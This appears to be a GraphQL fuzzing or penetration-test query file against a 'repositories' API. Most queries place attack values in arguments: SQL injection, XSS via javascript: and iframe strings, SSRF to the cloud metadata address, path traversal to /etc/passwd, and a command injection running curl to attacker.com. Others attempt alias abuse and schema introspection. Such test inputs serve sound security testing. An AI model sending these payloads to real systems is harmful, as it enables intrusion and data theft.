query.query:
query {
  repositories(first: 10, from: "initialCursor") {
    items {
      id
      type
      itemCount
    }
  }
}

query {
  repositories(from: "1' UNION SELECT * FROM repositories--") {
    items {
      id
      description {
        history
      }
    }
  }
}

query {
  repositories(from: "javascript:alert(1)//") {
    items {
      id
      description {
        name
      }
    }
  }
}

query {
  repositories(from: "http://169.254.169.254/latest/meta-data") {
    items {
      id
      links {
        targets
      }
    }
  }
}

query {
  repositories(after: ";curl${IFS}attacker.com") {
    items {
      id
      systemEvents {
        logMessage
      }
    }
  }
}

query {
  repositories(from: "../../../../etc/passwd") {
    items {
      id
      annotations {
        body
      }
    }
  }
}

query {
  repositories(from: "<iframe src='javascript:alert(1)'>") {
    items {
      id
      description {
        administrativeStructure
      }
    }
  }
}

query {
  repositories {
    items {
      systemEvents {
        eventType
        timestamp
      }
      annotations {
        body
      }
    }
  }
}

query {
  s: repositories {
    r1: items {
      s1: systemEvents {
        e1: eventType
      }
      a1: annotations {
        b1: body
      }
    }
  }
}

query {
  repositories {
    queryType {
      name
    }
    mutationType {
      name
    }
    subscriptionType {
      name
    }
    types {
      name
      kind
    }
  }
}
